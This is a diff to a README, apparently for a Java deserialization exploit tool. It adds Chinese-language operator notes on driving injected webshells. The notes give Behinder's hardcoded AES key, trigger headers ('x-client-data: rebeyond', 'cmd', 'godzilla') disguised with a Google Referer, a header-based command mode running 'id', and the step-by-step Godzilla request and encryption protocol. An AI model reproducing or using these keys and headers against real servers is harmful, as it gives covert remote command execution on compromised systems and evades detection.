@@ -53,6 +53,42 @@ List :
 - Spring2
 - Vaadin1
 
+#### 解读
+```
+1、输出、输入 AES 解密 3c6e0b8a9c15224a
+
+2、冰蝎 AES加密 class key 统一 为  3c6e0b8a9c15224a, old: e45e329feb5d925b
+冰蝎 优点，可以自主 处理大数据流，
+x-client-data:rebeyond
+Referer:https://www.google.com/
+
+payload：POST base64(AES 加密的class) for one line
+必须实现 equals 传入 pageContext
+每次请求必须是POST
+
+3、常规命令
+x-client-data: cmd
+cmd:id
+Referer:https://www.google.com/
+
+缺点：依赖 Runtime.getRuntime().exec ，一旦 该 api 加入黑名单无法执行
+
+4、哥斯拉?=pass=base64(AES(cmd))  缺点，不能处理大数据流
+payload=通过URLClassLoader加载、defineClass 从pass解密后的数据，这时 cmd 是序列化后的 URL 对象的序列化对象字节
+第二次请求使用 payload：
+f.equals(java.io.ByteArrayOutputStream arrOut);
+f.equals(pass解密后的数据 []byte ); // 第二次请求传入 的pass数据
+f.equals(request);
+输出：md5 =md5("pass" + "3c6e0b8a9c15224a") // 输出数据分割符号
+f.toString();
+输出：base64(AES(arrOut)) 这里输出了 toString 最终 执行的所有结果
+输出：md5 =md5("pass" + "3c6e0b8a9c15224a")  // 输出数据分割符号
+也就是 哥斯拉 的封装：
+连续3次 执行equals 传入不同类型对象，最终将执行的结果缓存到 arrOut 最后再加密输出
+
+x-client-data:godzilla
+Referer:https://www.google.com/
+```
 
 ## Description
 
